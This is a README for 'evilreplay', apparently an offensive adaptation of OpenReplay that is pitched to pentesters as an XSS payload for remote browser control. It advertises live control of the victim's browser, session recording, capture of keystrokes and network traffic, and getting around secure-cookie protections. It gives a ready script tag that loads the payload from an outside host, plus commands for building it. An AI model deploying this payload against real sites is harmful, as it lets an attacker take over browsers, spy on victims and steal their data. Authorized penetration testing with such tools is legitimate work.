<p align="center">
  <a href="https://github.com/EgeBalci/evilreplay">
    <img src="https://github.com/EgeBalci/evilreplay/raw/master/.github/img/banner.png">
  </a>
</p>

<h3 align="center">Seamless remote browser control for pentesters</h3>

<p align="center">
  <a href="https://docs.openreplay.com/deployment/deploy-aws">
    <img src="static/btn-deploy-aws.svg" height="40"/>
  </a>

  <a href="https://docs.openreplay.com/deployment/deploy-gcp">
    <img src="static/btn-deploy-google-cloud.svg" height="40" />
  </a>

  <a href="https://docs.openreplay.com/deployment/deploy-azure">
    <img src="static/btn-deploy-azure.svg" height="40" />
  </a>

  <a href="https://docs.openreplay.com/deployment/deploy-digitalocean">
    <img src="static/btn-deploy-digital-ocean.svg" height="40" />
  </a>
</p>


This tool is a weaponized adaptation of the [OpenReplay project](https://github.com/openreplay/openreplay), tailored for penetration testers and security professionals to demonstrate and assess the impact of Cross-Site Scripting (XSS) vulnerabilities in restricted environments without the need for stealing cookies.

https://github.com/user-attachments/assets/ef0f4018-db54-47b4-8513-90ae7a244e3a

### 🔥 Key Features

* 🎯 **Remote Browser Control**
  Interact with the victim’s browser in real time via an intuitive UI — click buttons, follow links, and simulate keystrokes remotely.

* 📹 **Automatic Session Recording**
  All victim interactions are recorded, providing replayable sessions for easier analysis and reporting of XSS findings.

* 🔍 **Deep Visibility**
  Obtain user inputs and detailed browser diagnostics:
  
  * User keyboard/mouse inputs and events
  * Console logs & JS errors
  * Network requests and responses
  * Application state and store actions
  * 40+ performance and behavior metrics

* 🛡️ **Bypasses Secure Contexts**
  Capture data even when secure cookies and modern browser protections are in place.

## Usage

The following script can be used as a XSS payload. **(don't forget to change the `projectKey`)** Follow the [Building The Payload](#Building-The-Payload) section for compiling the payload from the source. (The `ingestPoint` parameter needs to be updated when self-hosting)


```html
<script src="https://ege.sh/drop/sc.js" onload=evilreplay("OEeP7C6ysFPXP8mDI04T")></script>
```

## Building The Payload

For building the `evilreplay.js` XSS payload from the souce you need to install [bun](https://bun.sh/) follow the steps below.

```
git clone https://github.com/EgeBalci/evilreplay
cd ./evilreplay/tracker/tracker-assist
bun install 
bun run build 
cd ../tracker 
bun run build 

# XSS payload is built as dist/iife/evilreplay.js
```

## Deployment Options

OpenReplay can be deployed anywhere. Follow our step-by-step guides for deploying it on major public clouds:

- [AWS](https://docs.openreplay.com/deployment/deploy-aws)
- [Google Cloud](https://docs.openreplay.com/deployment/deploy-gcp)
- [Azure](https://docs.openreplay.com/deployment/deploy-azure)
- [Digital Ocean](https://docs.openreplay.com/deployment/deploy-digitalocean)
- [Scaleway](https://docs.openreplay.com/deployment/deploy-scaleway)
- [OVHcloud](https://docs.openreplay.com/deployment/deploy-ovhcloud)
- [Kubernetes](https://docs.openreplay.com/deployment/deploy-kubernetes)


